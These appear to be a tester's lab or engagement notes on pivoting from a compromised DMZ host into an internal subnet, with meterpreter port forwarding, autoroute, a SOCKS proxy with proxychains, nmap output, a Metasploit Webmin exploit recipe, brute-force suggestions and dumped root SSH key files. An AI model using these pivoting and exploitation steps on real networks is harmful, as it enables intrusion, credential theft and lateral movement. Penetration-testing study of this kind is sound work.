The challenge here is this target is on a different subnet.

## Subnet: `192.168.0.0/24`

We need local port forwarding or some kind of autoroute to enumerate 

```bash
meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    169.254.169.123  02:19:54:ee:38:41  8
    169.254.169.254  02:19:54:ee:38:41  8
    192.168.0.1      02:a5:7f:98:f2:eb  27
    192.168.0.2      02:a5:7f:98:f2:eb  27
    192.168.0.51     02:ad:e3:2e:22:43  27
    192.168.0.255    ff:ff:ff:ff:ff:ff  27
    192.168.100.1    02:19:54:ee:38:41  8
    192.168.100.5    02:d3:17:d9:f2:cf  8
    192.168.100.255  ff:ff:ff:ff:ff:ff  8
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  8
    224.0.0.22       01:00:5e:00:00:16  27
    224.0.0.251      01:00:5e:00:00:fb  8
    224.0.0.251      01:00:5e:00:00:fb  27
    224.0.0.252      01:00:5e:00:00:fc  8
    224.0.0.252      01:00:5e:00:00:fc  27
    255.255.255.255  ff:ff:ff:ff:ff:ff  8
    255.255.255.255  ff:ff:ff:ff:ff:ff  27

```

This is the arp cache from DMZ server.

## Internal Target 1

```bash
C:\Windows\system32>ping -n 2 192.168.0.51
ping -n 2 192.168.0.51

Pinging 192.168.0.51 with 32 bytes of data:
Reply from 192.168.0.51: bytes=32 time<1ms TTL=64
Reply from 192.168.0.51: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.0.51:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

```

## IP: `192.168.0.51`
## OS: Linux

## Internal Target 2

```powershell
PS C:\inetpub\wwwroot> ping -n 2 192.168.0.57

Pinging 192.168.0.57 with 32 bytes of data:
Reply from 192.168.0.57: bytes=32 time=2ms TTL=6
Reply from 192.168.0.57: bytes=32 time=1ms TTL=6

Ping statistics for 192.168.0.57:
    Packets: Sent = 2, Received = 2, Lost = 0 (0
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 2ms, Average = 1ms
```

The local relays for this machine

```bash
meterpreter > portfwd add -l 2022 -p 22 -r 192.168.0.51
[*] Local TCP relay created: :2022 <-> 192.168.0.51:22
meterpreter > portfwd add -l 2080 -p 80 -r 192.168.0.51
[*] Local TCP relay created: :2080 <-> 192.168.0.51:80
meterpreter > portfwd add -l 2089 -p 3389 -r 192.168.0.51
[*] Local TCP relay created: :2089 <-> 192.168.0.51:3389
meterpreter > portfwd add -l 2000 -p 10000 -r 192.168.0.51
[*] Local TCP relay created: :2000 <-> 192.168.0.51:10000

```

```bash
                                                                                                                                                                                            
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 22
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:22  ...  OK
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7
^C
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 23                                                                                                                                                      1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:23 <--denied
(UNKNOWN) [192.168.0.57] 23 (telnet) : Connection refused
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─#                                                                                                                                                                                      1 ⨯
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 21                                                                                                                                                    130 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:21 <--denied
(UNKNOWN) [192.168.0.57] 21 (ftp) : Connection refused
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 3389                                                                                                                                                    1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:3389 <--denied
(UNKNOWN) [192.168.0.57] 3389 (ms-wbt-server) : Connection refused
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 445                                                                                                                                                     1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:445 <--denied
(UNKNOWN) [192.168.0.57] 445 (microsoft-ds) : Connection refused
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 139                                                                                                                                                     1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:139 <--denied
(UNKNOWN) [192.168.0.57] 139 (netbios-ssn) : Connection refused
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 25                                                                                                                                                      1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:25 <--denied
(UNKNOWN) [192.168.0.57] 25 (smtp) : Connection refused
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nc 192.168.0.57 443                                                                                                                                                     1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.57:443 <--denied
(UNKNOWN) [192.168.0.57] 443 (https) : Connection refused

```
## NMAP Scan Results for Internal Target 1

```bash
                                                                                                                                     
┌──(rootkali)-[~/Internal_Targets]
└─# nmap -sC -sV -T4 -p2022,2080,2089,2000 localhost -oN Internal_Linux_Target1.txt

Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 02:21 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000024s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE       VERSION
2000/tcp open  http          MiniServ 1.920 (Webmin httpd)
|_http-title: Login to Webmin
|_http-server-header: MiniServ/1.920
2022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:0c:7a:e3:d0:d6:5c:57:eb:bf:8a:3f:a7:ba:2a:ba (RSA)
|   256 e7:59:21:1a:0f:ee:d2:98:2a:b8:3f:85:01:23:07:30 (ECDSA)
|_  256 46:88:59:00:55:03:70:72:fe:39:5c:75:24:0a:75:66 (ED25519)
2080/tcp open  http          Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
2089/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.05 seconds

```

## Port 2000 (MiniServ 1.920 (Webmin httpd))

### 🔹 1. **Port 2000 → Webmin (MiniServ 1.920)**

- **Why interesting**: Webmin has a long history of **remote code execution** bugs.
    
- Version `1.920` is known to be vulnerable to **CVE-2019-15107** → an **unauthenticated remote command execution** via crafted request.
    
- Exploitable with Metasploit:
    
    ```bash
    use exploit/linux/http/webmin_backdoor
    set RHOSTS 192.168.x.x
    set RPORT 2000
    run
    ```
    
- Or with curl if simple. This could be your fastest **root-level shell** if the service is misconfigured.
    

✅ **High priority target**
## Port 2022 (SSH)

## Port 2089 (Microsoft Terminal Service)

Nice scan output — you’ve uncovered **4 exposed services** on the target, and each one has potential attack paths. Let’s triage them like a pentester would:

---



---

### 🔹 2. **Port 2022 → OpenSSH 8.2p1 (Ubuntu)**

- **Why interesting**: SSH is a direct way in — if you have **valid creds**.
    
- Not usually remotely exploitable by version alone (OpenSSH 8.2 is secure against known RCEs).
    
- Attack vectors:
    
    - Brute force with Hydra or CME if usernames/passwords are weak.
        
    - Credential reuse from earlier findings (database dumps, WordPress/Drupal creds).
        
- If Webmin gives you a foothold, you might dump passwords and then pivot into SSH.
    

⚡ **Medium priority**, useful once creds are found.

---

### 🔹 3. **Port 2080 → Apache 2.4.41 (Ubuntu)**

- **Why interesting**: Apache itself is stable, but what matters is **what’s running on it**.
    
- Steps:
    
    - Dirbust/gobuster to enumerate endpoints:
        
        ```bash
        gobuster dir -u http://192.168.x.x:2080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
        ```
        
    - Look for web apps (PHP, CMS, login forms).
        
    - Possible web exploits: LFI/RFI, file uploads, SQLi.
        

⚡ **Investigate**, could be your entry point if it hosts an app.

---

### 🔹 4. **Port 2089 → RDP (ms-wbt-server)**

- **Why interesting**: Windows RDP service → direct GUI access.
    
- Security depends on creds. No obvious versioned exploits here (post-BlueKeep era).
    
- Attack vectors:
    
    - Brute force/spray with Hydra or Metasploit.
        
    - Credential reuse again.
        
    - If NLA is disabled → possible username-only bypass (like you tested earlier with `xfreerdp`).
        

⚡ **Useful if creds are found**, but not directly exploitable.

---

### 🧭 Strategy

1. **Hit Webmin (2000)** first → likely RCE → root shell on Ubuntu.
    
2. Use that foothold to dump creds (SSH keys, `/etc/shadow`, DBs).
    
3. Try creds on **SSH (2022)** and **RDP (2089)**.
    
4. Enumerate **Apache (2080)** for web apps → possible further exploitation.
    

---

👉 Bottom line:

- **Webmin (2000)** = most likely direct exploit → root.
    
- **Apache (2080)** = investigate app-level vulns.
    
- **SSH (2022) & RDP (2089)** = rely on valid creds/bruteforce.
    


## SSH Keys Dumped from The Target 1 in the internal network

```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdIXSwB353GjkkZ6rWclir3qHwOx+P1A3Hcg+82IelP1KaS7rPQ7O4UCq4w5x7BJPEvCMulYKmpLeR18SQTxXUXHPJXHre9P3q9n9Y+MtR8ve6enu8Y1DuKHcAPcf3IKPINhVddCF8S/bPjsijjPqHeBxJQYsy1W3++6Ty1or8nNka7W/ErhnG55KWnIlwc9ZzMkN+ozQyfHZ2td0b/b5CRF2j5N15K4dAaLzBs6t6vctm+mWxh0pIS6ztYDalsLtvZO2DsyGM4gHhRLxwT62z9sXZdAirs9FlrXZs5zramnfxo+G3fQ8eTt3eN1sFLMVcp+bMBaWfngX94KF/yNTt Production SSH Key - Linode

```

```bash
root@ip-192-168-0-51:~/.ssh# cat known_hosts
cat known_hosts
|1|KiD33CynKXR/QXwNepIDzmBHnqA=|P2f1HbNTP10VzdYNRTMQytzStT0= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJAlXdUC/y3vKewxXCxfVEeJGEAY83sAwNQgDbz4gMQm3i4Ff41xRN2XGyPZU5S1vIGz9Z9AgSUWHdeWf001Wjw=
root@ip-192-168-0-51:~/.ssh# cat authorized_keys
cat authorized_keys
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdIXSwB353GjkkZ6rWclir3qHwOx+P1A3Hcg+82IelP1KaS7rPQ7O4UCq4w5x7BJPEvCMulYKmpLeR18SQTxXUXHPJXHre9P3q9n9Y+MtR8ve6enu8Y1DuKHcAPcf3IKPINhVddCF8S/bPjsijjPqHeBxJQYsy1W3++6Ty1or8nNka7W/ErhnG55KWnIlwc9ZzMkN+ozQyfHZ2td0b/b5CRF2j5N15K4dAaLzBs6t6vctm+mWxh0pIS6ztYDalsLtvZO2DsyGM4gHhRLxwT62z9sXZdAirs9FlrXZs5zramnfxo+G3fQ8eTt3eN1sFLMVcp+bMBaWfngX94KF/yNTt Production SSH Key - Linode

```

## Internal Network Traffic Proxy

After compromising `Target4.local` let's setup a proxychain to let my traffic through that target4.local to the internal subnet.
### 1. Add a Route Inside Meterpreter

First, tell Meterpreter which internal subnet is reachable through your session:

```bash
meterpreter > run autoroute -s 192.168.0.0/24
```

Replace `192.168.0.0/24` with the subnet you discovered (check with `ipconfig`/`ifconfig` inside Meterpreter).

You can verify the routes with:

```bash
meterpreter > run autoroute -p
```

---

### 2. Start a SOCKS Proxy in Metasploit

In a new msfconsole tab (keep your Meterpreter session alive):

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 4a
msf6 auxiliary(socks_proxy) > run
```

- `SRVHOST 127.0.0.1` → binds proxy to localhost
    
- `SRVPORT 1080` → default SOCKS port
    
- `VERSION 4a` → older SOCKS4a works best with proxychains
    

Now you’ve got a local SOCKS proxy listening on `127.0.0.1:1080`.

---

### 3. Configure Proxychains

Edit your proxychains config file on Kali (usually `/etc/proxychains.conf` or `/etc/proxychains4.conf`):

At the bottom, add:

```
socks4  127.0.0.1 1080
```

Save it.

---

### 4. Use Proxychains with Your Tools

Now you can run almost any tool through the pivoted SOCKS proxy.

Example — scanning the internal subnet with nmap:

```bash
proxychains nmap -sT -Pn -p 22,80,445 192.168.0.0/24
```

Example — browsing with curl:

```bash
proxychains curl http://192.168.0.10
```

Or even SQL injection testing with sqlmap:

```bash
proxychains sqlmap -u "http://192.168.0.20/vuln.php?id=1"
```

---

That’s the standard pentest workflow:  
**Meterpreter foothold → autoroute → socks_proxy → proxychains → use your favorite tools inside the target’s network.**

## Internal Target 2 

## NMAP Scan result for Target 2 running Ubuntu and SSH

```bash
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# proxychains4 nmap -sV  -Pn -p22 192.168.0.57
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 13:55 IST
Nmap scan report for ip-192-168-0-57.ap-south-1.compute.internal (192.168.0.57)
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds

```

